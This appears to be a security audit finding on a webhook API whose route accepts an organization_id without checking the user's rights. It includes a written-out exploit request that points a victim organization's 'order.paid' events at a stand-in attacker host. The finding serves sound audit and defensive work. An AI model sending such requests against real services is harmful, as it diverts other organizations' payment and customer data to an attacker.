diagnosis: The route accepts an optional organization_id within the Pydantic schema and uses it to configure the webhook destination if present. It does not check whether user has administrative authority over that organization. A standard user can register a malicious webhook listener under a victim organization's ID to receive their payment and customer event payloads.
exploit_request:
POST /api/v2/webhooks HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"url": "https://attacker.com/listen", "subscribed_events": ["order.paid"], "organization_id": 4410}
